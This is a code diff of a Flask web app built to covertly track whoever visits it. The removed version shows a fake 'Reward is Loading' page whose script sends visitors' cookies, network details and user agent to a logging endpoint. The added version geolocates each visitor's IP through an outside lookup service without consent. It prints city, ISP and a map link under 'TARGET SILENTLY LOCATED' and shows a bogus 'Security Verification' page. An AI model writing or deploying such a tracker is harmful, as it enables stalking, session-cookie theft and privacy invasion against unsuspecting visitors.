@@ -1,49 +1,26 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request
+import requests
 
 app = Flask(__name__)
 
-HTML_PAGE = '''
-<!DOCTYPE html>
-<html>
-<head><title>Processing Reward...</title></head>
-<body style="text-align: center; background-color: #f0f0f0; padding-top: 50px; font-family: sans-serif;">
-    <h2>🎁 Reward is Loading...</h2>
-    <p>Please wait while we verify your device connection.</p>
-    
-    <script>
-        // Silent Network & Device Tracking
-        const networkInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        const connectionType = networkInfo ? networkInfo.effectiveType : 'unknown';
-        const downlinkSpeed = networkInfo ? networkInfo.downlink + 'Mbps' : 'unknown';
-
-        fetch('/log?c=' + document.cookie + 
-              '&type=' + connectionType + 
-              '&speed=' + downlinkSpeed + 
-              '&ua=' + navigator.userAgent);
-    </script>
-</body>
-</html>
-'''
-
 @app.route('/')
-def index():
-    return render_template_string(HTML_PAGE)
-
-@app.route('/log')
-def log():
-    cookie = request.args.get('c')
-    conn_type = request.args.get('type')
-    speed = request.args.get('speed')
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+def home():
+    # Target ka asli IP nikalna
+    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
     
-    print(f"\n--- [!!!] TARGET NETWORK CAPTURED [!!!] ---")
-    print(f"IP Address: {user_ip}")
-    print(f"Connection Type: {conn_type}")
-    print(f"Downlink Speed: {speed}")
-    print(f"Captured Cookie: {cookie}")
-    print(f"-------------------------------------------\n")
-    
-    return "OK"
+    # Silent Location (Bina permission ke)
+    try:
+        data = requests.get(f'https://ipapi.co/{ip}/json/').json()
+        city = data.get('city', 'Unknown')
+        isp = data.get('org', 'Unknown')
+        lat = data.get('latitude', '0')
+        lon = data.get('longitude', '0')
+    except:
+        city = isp = lat = lon = "Error"
 
-if __name__ == '__main__':
-    app.run(debug=True)
+    # Logs mein print karna (Ye Vercel Logs mein nazar ayega)
+    print(f"\n--- [!!!] TARGET SILENTLY LOCATED [!!!] ---")
+    print(f"IP: {ip} | City: {city} | ISP: {isp}")
+    print(f"Google Map: https://www.google.com/maps?q={lat},{lon}\n")
+
+    return "<h2>Security Verification...</h2><p>Checking connection stability, please wait.</p>"
